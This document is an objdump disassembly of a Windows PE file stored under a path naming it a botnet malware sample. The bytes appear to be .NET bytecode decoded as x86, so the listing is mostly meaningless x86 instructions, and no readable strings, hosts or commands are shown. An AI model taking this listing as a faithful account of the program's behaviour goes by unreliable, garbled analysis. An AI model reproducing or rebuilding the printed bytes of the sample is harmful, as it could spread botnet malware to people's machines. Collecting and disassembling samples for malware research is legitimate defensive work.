
malware_samples/botnet/5680ad54e90963f572f02cf77efc673828d5992bb8a935e83015ef26daf8d9b6.exe:     file format pei-i386


Disassembly of section .text:

00402000 <.text>:
  402000:	b0 cc                	mov    $0xcc,%al
  402002:	00 00                	add    %al,(%eax)
  402004:	00 00                	add    %al,(%eax)
  402006:	00 00                	add    %al,(%eax)
  402008:	48                   	dec    %eax
  402009:	00 00                	add    %al,(%eax)
  40200b:	00 02                	add    %al,(%edx)
  40200d:	00 05 00 20 57 00    	add    %al,0x572000
  402013:	00 5c 75 00          	add    %bl,0x0(%ebp,%esi,2)
  402017:	00 01                	add    %al,(%ecx)
  402019:	00 00                	add    %al,(%eax)
  40201b:	00 01                	add    %al,(%ecx)
  40201d:	00 00                	add    %al,(%eax)
  40201f:	06                   	push   %es
	...
  402050:	bf eb 1e 56 fb       	mov    $0xfb561eeb,%edi
  402055:	cd 97                	int    $0x97
  402057:	3b b2 19 02 24 30    	cmp    0x30240219(%edx),%esi
  40205d:	a5                   	movsl  %ds:(%esi),%es:(%edi)
  40205e:	78 43                	js     0x4020a3
  402060:	00 3d 56 44 d2 1e    	add    %bh,0x1ed24456
  402066:	62 b9 d4 f1 80 e7    	bound  %edi,-0x187f0e2c(%ecx)
  40206c:	e6 c3                	out    %al,$0xc3
  40206e:	39 41 2e             	cmp    %eax,0x2e(%ecx)
  402071:	00 2f                	add    %ch,(%edi)
  402073:	00 5c 00 00          	add    %bl,0x0(%eax,%eax,1)
  402077:	00 1e                	add    %bl,(%esi)
  402079:	02 28                	add    (%eax),%ch
  40207b:	1a 00                	sbb    (%eax),%al
  40207d:	00 0a                	add    %cl,(%edx)
  40207f:	2a 1a                	sub    (%edx),%bl
  402081:	7e 12                	jle    0x402095
  402083:	00 00                	add    %al,(%eax)
  402085:	04 2a                	add    $0x2a,%al
  402087:	1e                   	push   %ds
  402088:	02 80 12 00 00 04    	add    0x4000012(%eax),%al
  40208e:	2a 1a                	sub    (%edx),%bl
  402090:	7e 13                	jle    0x4020a5
  402092:	00 00                	add    %al,(%eax)
  402094:	04 2a                	add    $0x2a,%al
  402096:	1e                   	push   %ds
  402097:	02 80 13 00 00 04    	add    0x4000013(%eax),%al
  40209d:	2a 1a                	sub    (%edx),%bl
  40209f:	7e 14                	jle    0x4020b5
  4020a1:	00 00                	add    %al,(%eax)
  4020a3:	04 2a                	add    $0x2a,%al
  4020a5:	1e                   	push   %ds
  4020a6:	02 80 14 00 00 04    	add    0x4000014(%eax),%al
  4020ac:	2a 1a                	sub    (%edx),%bl
  4020ae:	7e 15                	jle    0x4020c5
  4020b0:	00 00                	add    %al,(%eax)
  4020b2:	04 2a                	add    $0x2a,%al
  4020b4:	1e                   	push   %ds
  4020b5:	02 80 15 00 00 04    	add    0x4000015(%eax),%al
  4020bb:	2a 1a                	sub    (%edx),%bl
  4020bd:	7e 16                	jle    0x4020d5
  4020bf:	00 00                	add    %al,(%eax)
  4020c1:	04 2a                	add    $0x2a,%al
  4020c3:	1e                   	push   %ds
  4020c4:	02 80 16 00 00 04    	add    0x4000016(%eax),%al
  4020ca:	2a 1a                	sub    (%edx),%bl
  4020cc:	7e 17                	jle    0x4020e5
  4020ce:	00 00                	add    %al,(%eax)
  4020d0:	04 2a                	add    $0x2a,%al
  4020d2:	1e                   	push   %ds
  4020d3:	02 80 17 00 00 04    	add    0x4000017(%eax),%al
  4020d9:	2a 1a                	sub    (%edx),%bl
  4020db:	7e 18                	jle    0x4020f5
  4020dd:	00 00                	add    %al,(%eax)
  4020df:	04 2a                	add    $0x2a,%al
  4020e1:	1e                   	push   %ds
  4020e2:	02 80 18 00 00 04    	add    0x4000018(%eax),%al
  4020e8:	2a 1a                	sub    (%edx),%bl
  4020ea:	7e 19                	jle    0x402105
  4020ec:	00 00                	add    %al,(%eax)
  4020ee:	04 2a                	add    $0x2a,%al
  4020f0:	1a 7e 1a             	sbb    0x1a(%esi),%bh
  4020f3:	00 00                	add    %al,(%eax)
  4020f5:	04 2a                	add    $0x2a,%al
  4020f7:	1e                   	push   %ds
  4020f8:	02 80 1a 00 00 04    	add    0x400001a(%eax),%al
  4020fe:	2a 1a                	sub    (%edx),%bl
  402100:	7e 1b                	jle    0x40211d
  402102:	00 00                	add    %al,(%eax)
  402104:	04 2a                	add    $0x2a,%al
  402106:	1e                   	push   %ds
  402107:	02 80 1b 00 00 04    	add    0x400001b(%eax),%al
  40210d:	2a 2a                	sub    (%edx),%ch
  40210f:	02 28                	add    (%eax),%ch
  402111:	3e 00 00             	add    %al,%ds:(%eax)
  402114:	0a 16                	or     (%esi),%dl
  402116:	fe 03                	incb   (%ebx)
  402118:	2a 32                	sub    (%edx),%dh
  40211a:	7e 0b                	jle    0x402127
  40211c:	00 00                	add    %al,(%eax)
  40211e:	04 03                	add    $0x3,%al
  402120:	6f                   	outsl  %ds:(%esi),(%dx)
  402121:	3f                   	aas
  402122:	00 00                	add    %al,(%eax)
  402124:	0a 2a                	or     (%edx),%ch
  402126:	36 28 17             	sub    %dl,%ss:(%edi)
  402129:	00 00                	add    %al,(%eax)
  40212b:	06                   	push   %es
  40212c:	17                   	pop    %ss
  40212d:	58                   	pop    %eax
  40212e:	28 18                	sub    %bl,(%eax)
  402130:	00 00                	add    %al,(%eax)
  402132:	06                   	push   %es
  402133:	2a 2e                	sub    (%esi),%ch
  402135:	73 1a                	jae    0x402151
  402137:	00 00                	add    %al,(%eax)
  402139:	0a 80 19 00 00 04    	or     0x4000019(%eax),%al
  40213f:	2a 32                	sub    (%edx),%dh
  402141:	7e 1c                	jle    0x40215f
  402143:	00 00                	add    %al,(%eax)
  402145:	04 02                	add    $0x2,%al
  402147:	6f                   	outsl  %ds:(%esi),(%dx)
  402148:	21 00                	and    %eax,(%eax)
  40214a:	00 0a                	add    %cl,(%edx)
  40214c:	2a 32                	sub    (%edx),%dh
  40214e:	7e 1c                	jle    0x40216c
  402150:	00 00                	add    %al,(%eax)
  402152:	04 02                	add    $0x2,%al
  402154:	6f                   	outsl  %ds:(%esi),(%dx)
  402155:	1d 00 00 0a 2a       	sbb    $0x2a0a0000,%eax
  40215a:	32 02                	xor    (%edx),%al
  40215c:	28 56 00             	sub    %dl,0x0(%esi)
  40215f:	00 0a                	add    %cl,(%edx)
  402161:	28 26                	sub    %ah,(%esi)
  402163:	00 00                	add    %al,(%eax)
  402165:	06                   	push   %es
  402166:	2a 8e 1a 8d 44 00    	sub    0x448d1a(%esi),%cl
  40216c:	00 01                	add    %al,(%ecx)
  40216e:	25 19 02 d2 9c       	and    $0x9cd20219,%eax
  402173:	25 18 02 1e 63       	and    $0x631e0218,%eax
  402178:	d2 9c 25 17 02 1f 10 	rcrb   %cl,0x101f0217(%ebp,%eiz,1)
  40217f:	63 d2                	arpl   %edx,%edx
  402181:	9c                   	pushf
  402182:	25 16 02 1f 18       	and    $0x181f0216,%eax
  402187:	63 d2                	arpl   %edx,%edx
  402189:	9c                   	pushf
  40218a:	2a 4e 18             	sub    0x18(%esi),%cl
  40218d:	8d 44 00 00          	lea    0x0(%eax,%eax,1),%eax
  402191:	01 25 17 02 d2 9c    	add    %esp,0x9cd20217
  402197:	25 16 02 1e 63       	and    $0x631e0216,%eax
  40219c:	d2 9c 2a 32 02 28 57 	rcrb   %cl,0x57280232(%edx,%ebp,1)
  4021a3:	00 00                	add    %al,(%eax)
  4021a5:	0a 28                	or     (%eax),%ch
  4021a7:	26 00 00             	add    %al,%es:(%eax)
  4021aa:	06                   	push   %es
  4021ab:	2a 2e                	sub    (%esi),%ch
  4021ad:	73 58                	jae    0x402207
  4021af:	00 00                	add    %al,(%eax)
  4021b1:	0a 80 1c 00 00 04    	or     0x400001c(%eax),%al
  4021b7:	2a 56 02             	sub    0x2(%esi),%dl
  4021ba:	15 7d 1e 00 00       	adc    $0x1e7d,%eax
  4021bf:	04 02                	add    $0x2,%al
  4021c1:	28 1a                	sub    %bl,(%edx)
  4021c3:	00 00                	add    %al,(%eax)
  4021c5:	0a 02                	or     (%edx),%al
  4021c7:	03 7d 1d             	add    0x1d(%ebp),%edi
  4021ca:	00 00                	add    %al,(%eax)
  4021cc:	04 2a                	add    $0x2a,%al
  4021ce:	4a                   	dec    %edx
  4021cf:	02 7b 1d             	add    0x1d(%ebx),%bh
  4021d2:	00 00                	add    %al,(%eax)
  4021d4:	04 02                	add    $0x2,%al
  4021d6:	7b 1e                	jnp    0x4021f6
  4021d8:	00 00                	add    %al,(%eax)
  4021da:	04 6f                	add    $0x6f,%al
  4021dc:	59                   	pop    %ecx
  4021dd:	00 00                	add    %al,(%eax)
  4021df:	0a 2a                	or     (%edx),%ch
  4021e1:	8a 02                	mov    (%edx),%al
  4021e3:	02 7b 1e             	add    0x1e(%ebx),%bh
  4021e6:	00 00                	add    %al,(%eax)
  4021e8:	04 17                	add    $0x17,%al
  4021ea:	58                   	pop    %eax
  4021eb:	7d 1e                	jge    0x40220b
  4021ed:	00 00                	add    %al,(%eax)
  4021ef:	04 02                	add    $0x2,%al
  4021f1:	7b 1e                	jnp    0x402211
  4021f3:	00 00                	add    %al,(%eax)
  4021f5:	04 02                	add    $0x2,%al
  4021f7:	7b 1d                	jnp    0x402216
  4021f9:	00 00                	add    %al,(%eax)
  4021fb:	04 6f                	add    $0x6f,%al
  4021fd:	5a                   	pop    %edx
  4021fe:	00 00                	add    %al,(%eax)
  402200:	0a fe                	or     %dh,%bh
  402202:	04 2a                	add    $0x2a,%al
  402204:	22 02                	and    (%edx),%al
  402206:	15 7d 1e 00 00       	adc    $0x1e7d,%eax
  40220b:	04 2a                	add    $0x2a,%al
  40220d:	56                   	push   %esi
  40220e:	02 28                	add    (%eax),%ch
  402210:	1a 00                	sbb    (%eax),%al
  402212:	00 0a                	add    %cl,(%edx)
  402214:	02 03                	add    (%ebx),%al
  402216:	7d 20                	jge    0x402238
  402218:	00 00                	add    %al,(%eax)
  40221a:	04 02                	add    $0x2,%al
  40221c:	04 7d                	add    $0x7d,%al
  40221e:	1f                   	pop    %ds
  40221f:	00 00                	add    %al,(%eax)
  402221:	04 2a                	add    $0x2a,%al
  402223:	32 02                	xor    (%edx),%al
  402225:	7b 20                	jnp    0x402247
  402227:	00 00                	add    %al,(%eax)
  402229:	04 6f                	add    $0x6f,%al
  40222b:	3f                   	aas
  40222c:	00 00                	add    %al,(%eax)
  40222e:	06                   	push   %es
  40222f:	2a 4e 02             	sub    0x2(%esi),%cl
  402232:	7b 20                	jnp    0x402254
  402234:	00 00                	add    %al,(%eax)
  402236:	04 6f                	add    $0x6f,%al
  402238:	3f                   	aas
  402239:	00 00                	add    %al,(%eax)
  40223b:	06                   	push   %es
  40223c:	25 03 6f 5a 00       	and    $0x5a6f03,%eax
  402241:	00 06                	add    %al,(%esi)
  402243:	2a 4e 02             	sub    0x2(%esi),%cl
  402246:	7b 20                	jnp    0x402268
  402248:	00 00                	add    %al,(%eax)
  40224a:	04 6f                	add    $0x6f,%al
  40224c:	3f                   	aas
  40224d:	00 00                	add    %al,(%eax)
  40224f:	06                   	push   %es
  402250:	25 03 6f 42 00       	and    $0x426f03,%eax
  402255:	00 06                	add    %al,(%esi)
  402257:	2a 4e 02             	sub    0x2(%esi),%cl
  40225a:	7b 20                	jnp    0x40227c
  40225c:	00 00                	add    %al,(%eax)
  40225e:	04 6f                	add    $0x6f,%al
  402260:	3f                   	aas
  402261:	00 00                	add    %al,(%eax)
  402263:	06                   	push   %es
  402264:	25 03 6f 53 00       	and    $0x536f03,%eax
  402269:	00 06                	add    %al,(%esi)
  40226b:	2a 36                	sub    (%esi),%dh
  40226d:	02 7b 1f             	add    0x1f(%ebx),%bh
  402270:	00 00                	add    %al,(%eax)
  402272:	04 03                	add    $0x3,%al
  402274:	6f                   	outsl  %ds:(%esi),(%dx)
  402275:	59                   	pop    %ecx
  402276:	00 00                	add    %al,(%eax)
  402278:	0a 2a                	or     (%edx),%ch
  40227a:	32 02                	xor    (%edx),%al
  40227c:	7b 1f                	jnp    0x40229d
  40227e:	00 00                	add    %al,(%eax)
  402280:	04 6f                	add    $0x6f,%al
  402282:	5a                   	pop    %edx
  402283:	00 00                	add    %al,(%eax)
  402285:	0a 2a                	or     (%edx),%ch
  402287:	66 02 03             	data16 add (%ebx),%al
  40228a:	7d 21                	jge    0x4022ad
  40228c:	00 00                	add    %al,(%eax)
  40228e:	04 02                	add    $0x2,%al
  402290:	02 7b 21             	add    0x21(%ebx),%bh
  402293:	00 00                	add    %al,(%eax)
  402295:	04 6f                	add    $0x6f,%al
  402297:	5b                   	pop    %ebx
  402298:	00 00                	add    %al,(%eax)
  40229a:	0a 7d 22             	or     0x22(%ebp),%bh
  40229d:	00 00                	add    %al,(%eax)
  40229f:	04 2a                	add    $0x2a,%al
  4022a1:	76 02                	jbe    0x4022a5
  4022a3:	7b 24                	jnp    0x4022c9
  4022a5:	00 00                	add    %al,(%eax)
  4022a7:	04 18                	add    $0x18,%al
  4022a9:	2e 0d 02 28 39 00    	cs or  $0x392802,%eax
  4022af:	00 06                	add    %al,(%esi)
  4022b1:	02 18                	add    (%eax),%bl
  4022b3:	7d 24                	jge    0x4022d9
  4022b5:	00 00                	add    %al,(%eax)
  4022b7:	04 02                	add    $0x2,%al
  4022b9:	28 3a                	sub    %bh,(%edx)
  4022bb:	00 00                	add    %al,(%eax)
  4022bd:	06                   	push   %es
  4022be:	2a 76 02             	sub    0x2(%esi),%dh
  4022c1:	7b 24                	jnp    0x4022e7
  4022c3:	00 00                	add    %al,(%eax)
  4022c5:	04 19                	add    $0x19,%al
  4022c7:	2e 0d 02 28 39 00    	cs or  $0x392802,%eax
  4022cd:	00 06                	add    %al,(%esi)
  4022cf:	02 19                	add    (%ecx),%bl
  4022d1:	7d 24                	jge    0x4022f7
  4022d3:	00 00                	add    %al,(%eax)
  4022d5:	04 02                	add    $0x2,%al
  4022d7:	28 3a                	sub    %bh,(%edx)
  4022d9:	00 00                	add    %al,(%eax)
  4022db:	06                   	push   %es
  4022dc:	2a 1e                	sub    (%esi),%bl
  4022de:	02 28                	add    (%eax),%ch
  4022e0:	3e 00 00             	add    %al,%ds:(%eax)
  4022e3:	06                   	push   %es
  4022e4:	2a 52 02             	sub    0x2(%edx),%dl
  4022e7:	03 8c 51 00 00 01 7d 	add    0x7d010000(%ecx,%edx,2),%ecx
  4022ee:	23 00                	and    (%eax),%eax
  4022f0:	00 04 02             	add    %al,(%edx,%eax,1)
  4022f3:	1b 7d 24             	sbb    0x24(%ebp),%edi
  4022f6:	00 00                	add    %al,(%eax)
  4022f8:	04 2a                	add    $0x2a,%al
  4022fa:	52                   	push   %edx
  4022fb:	02 03                	add    (%ebx),%al
  4022fd:	8c 52 00             	mov    %ss,0x0(%edx)
  402300:	00 01                	add    %al,(%ecx)
  402302:	7d 23                	jge    0x402327
  402304:	00 00                	add    %al,(%eax)
  402306:	04 02                	add    $0x2,%al
  402308:	1c 7d                	sbb    $0x7d,%al
  40230a:	24 00                	and    $0x0,%al
  40230c:	00 04 2a             	add    %al,(%edx,%ebp,1)
  40230f:	42                   	inc    %edx
  402310:	02 03                	add    (%ebx),%al
  402312:	7d 23                	jge    0x402337
  402314:	00 00                	add    %al,(%eax)
  402316:	04 02                	add    $0x2,%al
  402318:	1f                   	pop    %ds
  402319:	0b 7d 24             	or     0x24(%ebp),%edi
  40231c:	00 00                	add    %al,(%eax)
  40231e:	04 2a                	add    $0x2a,%al
  402320:	52                   	push   %edx
  402321:	02 28                	add    (%eax),%ch
  402323:	3e 00 00             	add    %al,%ds:(%eax)
  402326:	06                   	push   %es
  402327:	25 03 7d 21 00       	and    $0x217d03,%eax
  40232c:	00 04 04             	add    %al,(%esp,%eax,1)
  40232f:	6f                   	outsl  %ds:(%esi),(%dx)
  402330:	4f                   	dec    %edi
  402331:	00 00                	add    %al,(%eax)
  402333:	06                   	push   %es
  402334:	2a 56 02             	sub    0x2(%esi),%dl
  402337:	28 3e                	sub    %bh,(%esi)
  402339:	00 00                	add    %al,(%eax)
  40233b:	06                   	push   %es
  40233c:	25 03 7d 21 00       	and    $0x217d03,%eax
  402341:	00 04 04             	add    %al,(%esp,%eax,1)
  402344:	6a 6f                	push   $0x6f
  402346:	42                   	inc    %edx
  402347:	00 00                	add    %al,(%eax)
  402349:	06                   	push   %es
  40234a:	2a f6                	sub    %dh,%dh
  40234c:	02 7b 23             	add    0x23(%ebx),%bh
  40234f:	00 00                	add    %al,(%eax)
  402351:	04 2c                	add    $0x2c,%al
  402353:	33 03                	xor    (%ebx),%eax
  402355:	1c 73                	sbb    $0x73,%al
  402357:	77 00                	ja     0x402359
  402359:	00 0a                	add    %cl,(%edx)
  40235b:	25 02 7b 23 00       	and    $0x237b02,%eax
  402360:	00 04 74             	add    %al,(%esp,%esi,2)
  402363:	03 00                	add    (%eax),%eax
  402365:	00 1b                	add    %bl,(%ebx)
  402367:	16                   	push   %ss
  402368:	02 7b 23             	add    0x23(%ebx),%bh
  40236b:	00 00                	add    %al,(%eax)
  40236d:	04 74                	add    $0x74,%al
  40236f:	03 00                	add    (%eax),%eax
  402371:	00 1b                	add    %bl,(%ebx)
  402373:	8e 69 6f             	mov    0x6f(%ecx),%gs
  402376:	4c                   	dec    %esp
  402377:	00 00                	add    %al,(%eax)
  402379:	0a 25 6f 76 00 00    	or     0x766f,%ah
  40237f:	0a 6f 41             	or     0x41(%edi),%ch
  402382:	00 00                	add    %al,(%eax)
  402384:	0a 17                	or     (%edi),%dl
  402386:	2a 16                	sub    (%esi),%dl
  402388:	2a 56 02             	sub    0x2(%esi),%dl
  40238b:	28 39                	sub    %bh,(%ecx)
  40238d:	00 00                	add    %al,(%eax)
  40238f:	06                   	push   %es
  402390:	02 14 7d 23 00 00 04 	add    0x4000023(,%edi,2),%dl
  402397:	02 17                	add    (%edi),%dl
  402399:	7d 24                	jge    0x4023bf
  40239b:	00 00                	add    %al,(%eax)
  40239d:	04 2a                	add    $0x2a,%al
  40239f:	3e 02 03             	add    %ds:(%ebx),%al
  4023a2:	7d 23                	jge    0x4023c7
  4023a4:	00 00                	add    %al,(%eax)
  4023a6:	04 02                	add    $0x2,%al
  4023a8:	1a 7d 24             	sbb    0x24(%ebp),%bh
  4023ab:	00 00                	add    %al,(%eax)
  4023ad:	04 2a                	add    $0x2a,%al
  4023af:	6a 02                	push   $0x2
  4023b1:	7b 23                	jnp    0x4023d6
  4023b3:	00 00                	add    %al,(%eax)
  4023b5:	04 2d                	add    $0x2d,%al
  4023b7:	06                   	push   %es
  4023b8:	72 6d                	jb     0x402427
  4023ba:	20 00                	and    %al,(%eax)
  4023bc:	70 2a                	jo     0x4023e8
  4023be:	02 7b 23             	add    0x23(%ebx),%bh
  4023c1:	00 00                	add    %al,(%eax)
  4023c3:	04 6f                	add    $0x6f,%al
  4023c5:	38 00                	cmp    %al,(%eax)
  4023c7:	00 0a                	add    %cl,(%edx)
  4023c9:	2a 52 02             	sub    0x2(%edx),%dl
  4023cc:	1d 7d 24 00 00       	sbb    $0x247d,%eax
  4023d1:	04 02                	add    $0x2,%al
  4023d3:	03 8c 5e 00 00 01 7d 	add    0x7d010000(%esi,%ebx,2),%ecx
  4023da:	23 00                	and    (%eax),%eax
  4023dc:	00 04 2a             	add    %al,(%edx,%ebp,1)
  4023df:	56                   	push   %esi
  4023e0:	02 1f                	add    (%edi),%bl
  4023e2:	09 7d 24             	or     %edi,0x24(%ebp)
  4023e5:	00 00                	add    %al,(%eax)
  4023e7:	04 02                	add    $0x2,%al
  4023e9:	03 8c 54 00 00 01 7d 	add    0x7d010000(%esp,%edx,2),%ecx
  4023f0:	23 00                	and    (%eax),%eax
  4023f2:	00 04 2a             	add    %al,(%edx,%ebp,1)
  4023f5:	52                   	push   %edx
  4023f6:	02 1e                	add    (%esi),%bl
  4023f8:	7d 24                	jge    0x40241e
  4023fa:	00 00                	add    %al,(%eax)
  4023fc:	04 02                	add    $0x2,%al
  4023fe:	03 8c 53 00 00 01 7d 	add    0x7d010000(%ebx,%edx,2),%ecx
  402405:	23 00                	and    (%eax),%eax
  402407:	00 04 2a             	add    %al,(%edx,%ebp,1)
  40240a:	1e                   	push   %ds
  40240b:	02 28                	add    (%eax),%ch
  40240d:	50                   	push   %eax
  40240e:	00 00                	add    %al,(%eax)
  402410:	06                   	push   %es
  402411:	2a 22                	sub    (%edx),%ah
  402413:	02 03                	add    (%ebx),%al
  402415:	28 4f 00             	sub    %cl,0x0(%edi)
  402418:	00 06                	add    %al,(%esi)
  40241a:	2a 1e                	sub    (%esi),%bl
  40241c:	02 28                	add    (%eax),%ch
  40241e:	45                   	inc    %ebp
  40241f:	00 00                	add    %al,(%eax)
  402421:	06                   	push   %es
  402422:	2a 22                	sub    (%edx),%ah
  402424:	02 03                	add    (%ebx),%al
  402426:	28 42 00             	sub    %al,0x0(%edx)
  402429:	00 06                	add    %al,(%esi)
  40242b:	2a 1e                	sub    (%esi),%bl
  40242d:	02 28                	add    (%eax),%ch
  40242f:	46                   	inc    %esi
  402430:	00 00                	add    %al,(%eax)
  402432:	06                   	push   %es
  402433:	2a 22                	sub    (%edx),%ah
  402435:	02 03                	add    (%ebx),%al
  402437:	28 53 00             	sub    %dl,0x0(%ebx)
  40243a:	00 06                	add    %al,(%esi)
  40243c:	2a 1e                	sub    (%esi),%bl
  40243e:	02 7b 24             	add    0x24(%ebx),%bh
  402441:	00 00                	add    %al,(%eax)
  402443:	04 2a                	add    $0x2a,%al
  402445:	32 02                	xor    (%edx),%al
  402447:	7b 26                	jnp    0x40246f
  402449:	00 00                	add    %al,(%eax)
  40244b:	04 73                	add    $0x73,%al
  40244d:	2d 00 00 06 2a       	sub    $0x2a060000,%eax
  402452:	4a                   	dec    %edx
  402453:	02 73 83             	add    -0x7d(%ebx),%dh
  402456:	00 00                	add    %al,(%eax)
  402458:	0a 7d 26             	or     0x26(%ebp),%bh
  40245b:	00 00                	add    %al,(%eax)
  40245d:	04 02                	add    $0x2,%al
  40245f:	28 1a                	sub    %bl,(%edx)
  402461:	00 00                	add    %al,(%eax)
  402463:	0a 2a                	or     (%edx),%ch
  402465:	3a 02                	cmp    (%edx),%al
  402467:	6f                   	outsl  %ds:(%esi),(%dx)
  402468:	7a 00                	jp     0x40246a
  40246a:	00 0a                	add    %cl,(%edx)
  40246c:	d2 02                	rolb   %cl,(%edx)
  40246e:	28 65 00             	sub    %ah,0x0(%ebp)
  402471:	00 06                	add    %al,(%esi)
  402473:	2a 32                	sub    (%edx),%dh
  402475:	02 20                	add    (%eax),%ah
  402477:	c0 00 00             	rolb   $0x0,(%eax)
  40247a:	00 6f 62             	add    %ch,0x62(%edi)
  40247d:	00 00                	add    %al,(%eax)
  40247f:	0a 2a                	or     (%edx),%ch
  402481:	6a 02                	push   $0x2
  402483:	20 cb                	and    %cl,%bl
  402485:	00 00                	add    %al,(%eax)
  402487:	00 6f 62             	add    %ch,0x62(%edi)
  40248a:	00 00                	add    %al,(%eax)
  40248c:	0a 02                	or     (%edx),%al
  40248e:	03 28                	add    (%eax),%ebp
  402490:	2a 00                	sub    (%eax),%al
  402492:	00 06                	add    %al,(%esi)
  402494:	16                   	push   %ss
  402495:	1e                   	push   %ds
  402496:	6f                   	outsl  %ds:(%esi),(%dx)
  402497:	4c                   	dec    %esp
  402498:	00 00                	add    %al,(%eax)
  40249a:	0a 2a                	or     (%edx),%ch
  40249c:	7e 02                	jle    0x4024a0
  40249e:	20 ca                	and    %cl,%dl
  4024a0:	00 00                	add    %al,(%eax)
  4024a2:	00 6f 62             	add    %ch,0x62(%edi)
  4024a5:	00 00                	add    %al,(%eax)
  4024a7:	0a 02                	or     (%edx),%al
  4024a9:	03 28                	add    (%eax),%ebp
  4024ab:	71 00                	jno    0x4024ad
  4024ad:	00 0a                	add    %cl,(%edx)
  4024af:	28 26                	sub    %ah,(%esi)
  4024b1:	00 00                	add    %al,(%eax)
  4024b3:	06                   	push   %es
  4024b4:	16                   	push   %ss
  4024b5:	1a 6f 4c             	sbb    0x4c(%edi),%ch
  4024b8:	00 00                	add    %al,(%eax)
  4024ba:	0a 2a                	or     (%edx),%ch
  4024bc:	6e                   	outsb  %ds:(%esi),(%dx)
  4024bd:	03 2c 0c             	add    (%esp,%ecx,1),%ebp
  4024c0:	02 20                	add    (%eax),%ah
  4024c2:	c3                   	ret
  4024c3:	00 00                	add    %al,(%eax)
  4024c5:	00 6f 62             	add    %ch,0x62(%edi)
  4024c8:	00 00                	add    %al,(%eax)
  4024ca:	0a 2a                	or     (%edx),%ch
  4024cc:	02 20                	add    (%eax),%ah
  4024ce:	c2 00 00             	ret    $0x0
  4024d1:	00 6f 62             	add    %ch,0x62(%edi)
  4024d4:	00 00                	add    %al,(%eax)
  4024d6:	0a 2a                	or     (%edx),%ch
  4024d8:	aa                   	stos   %al,%es:(%edi)
  4024d9:	28 75 00             	sub    %dh,0x0(%ebp)
  4024dc:	00 06                	add    %al,(%esi)
  4024de:	2d 1c 28 76 00       	sub    $0x76281c,%eax
  4024e3:	00 06                	add    %al,(%esi)
  4024e5:	2d 15 28 77 00       	sub    $0x772815,%eax
  4024ea:	00 06                	add    %al,(%esi)
  4024ec:	2d 0e 28 73 00       	sub    $0x73280e,%eax
  4024f1:	00 06                	add    %al,(%esi)
  4024f3:	2d 07 28 74 00       	sub    $0x742807,%eax
  4024f8:	00 06                	add    %al,(%esi)
  4024fa:	2c 06                	sub    $0x6,%al
  4024fc:	14 28                	adc    $0x28,%al
  4024fe:	a9 00 00 0a 2a       	test   $0x2a0a0000,%eax
  402503:	56                   	push   %esi
  402504:	28 d0                	sub    %dl,%al
  402506:	00 00                	add    %al,(%eax)
  402508:	0a 73 d1             	or     -0x2f(%ebx),%dh
  40250b:	00 00                	add    %al,(%eax)
  40250d:	0a 20                	or     (%eax),%ah
  40250f:	20 02                	and    %al,(%edx)
  402511:	00 00                	add    %al,(%eax)
  402513:	6f                   	outsl  %ds:(%esi),(%dx)
  402514:	d2 00                	rolb   %cl,(%eax)
  402516:	00 0a                	add    %cl,(%edx)
  402518:	2a 62 7e             	sub    0x7e(%edx),%ah
  40251b:	39 00                	cmp    %eax,(%eax)
  40251d:	00 04 2c             	add    %al,(%esp,%ebp,1)
  402520:	10 7e 39             	adc    %bh,0x39(%esi)
  402523:	00 00                	add    %al,(%eax)
  402525:	04 6f                	add    $0x6f,%al
  402527:	df 00                	filds  (%eax)
  402529:	00 0a                	add    %cl,(%edx)
  40252b:	14 80                	adc    $0x80,%al
  40252d:	39 00                	cmp    %eax,(%eax)
  40252f:	00 04 2a             	add    %al,(%edx,%ebp,1)
  402532:	66 7e 0f             	data16 jle 0x402544
  402535:	00 00                	add    %al,(%eax)
  402537:	04 28                	add    $0x28,%al
  402539:	17                   	pop    %ss
  40253a:	00 00                	add    %al,(%eax)
  40253c:	0a 2c 0c             	or     (%esp,%ecx,1),%ch
  40253f:	28 81 00 00 06 2c    	sub    %al,0x2c060000(%ecx)
  402545:	05 28 8b 00 00       	add    $0x8b28,%eax
  40254a:	06                   	push   %es
  40254b:	2a 56 72             	sub    0x72(%esi),%dl
  40254e:	03 26                	add    (%esi),%esp
  402550:	00 70 7e             	add    %dh,0x7e(%eax)
  402553:	10 00                	adc    %al,(%eax)
  402555:	00 04 28             	add    %al,(%eax,%ebp,1)
  402558:	51                   	push   %ecx
  402559:	00 00                	add    %al,(%eax)
  40255b:	0a 80 3a 00 00 04    	or     0x400003a(%eax),%al
  402561:	2a be 73 62 00 00    	sub    0x6273(%esi),%bh
  402567:	06                   	push   %es
  402568:	25 72 81 20 00       	and    $0x208172,%eax
  40256d:	70 6f                	jo     0x4025de
  40256f:	4d                   	dec    %ebp
  402570:	00 00                	add    %al,(%eax)
  402572:	06                   	push   %es
  402573:	72 af                	jb     0x402524
  402575:	26 00 70 6f          	add    %dh,%es:0x6f(%eax)
  402579:	5a                   	pop    %edx
  40257a:	00 00                	add    %al,(%eax)
  40257c:	06                   	push   %es
  40257d:	6f                   	outsl  %ds:(%esi),(%dx)
  40257e:	57                   	push   %edi
  40257f:	00 00                	add    %al,(%eax)
  402581:	06                   	push   %es
  402582:	28 1e                	sub    %bl,(%esi)
  402584:	00 00                	add    %al,(%eax)
  402586:	06                   	push   %es
  402587:	20 e8                	and    %ch,%al
  402589:	03 00                	add    (%eax),%eax
  40258b:	00 28                	add    %ch,(%eax)
  40258d:	14 00                	adc    $0x0,%al
  40258f:	00 0a                	add    %cl,(%edx)
  402591:	2a da                	sub    %dl,%bl
  402593:	73 62                	jae    0x4025f7
  402595:	00 00                	add    %al,(%eax)
  402597:	06                   	push   %es
  402598:	25 72 81 20 00       	and    $0x208172,%eax
  40259d:	70 6f                	jo     0x40260e
  40259f:	4d                   	dec    %ebp
  4025a0:	00 00                	add    %al,(%eax)
  4025a2:	06                   	push   %es
  4025a3:	72 c1                	jb     0x402566
  4025a5:	26 00 70 6f          	add    %dh,%es:0x6f(%eax)
  4025a9:	5a                   	pop    %edx
  4025aa:	00 00                	add    %al,(%eax)
  4025ac:	06                   	push   %es
  4025ad:	25 72 c1 26 00       	and    $0x26c172,%eax
  4025b2:	70 6f                	jo     0x402623
  4025b4:	4d                   	dec    %ebp
  4025b5:	00 00                	add    %al,(%eax)
  4025b7:	06                   	push   %es
  4025b8:	02 6f 5a             	add    0x5a(%edi),%ch
  4025bb:	00 00                	add    %al,(%eax)
  4025bd:	06                   	push   %es
  4025be:	6f                   	outsl  %ds:(%esi),(%dx)
  4025bf:	57                   	push   %edi
  4025c0:	00 00                	add    %al,(%eax)
  4025c2:	06                   	push   %es
  4025c3:	28 1e                	sub    %bl,(%esi)
  4025c5:	00 00                	add    %al,(%eax)
  4025c7:	06                   	push   %es
  4025c8:	2a 2e                	sub    (%esi),%ch
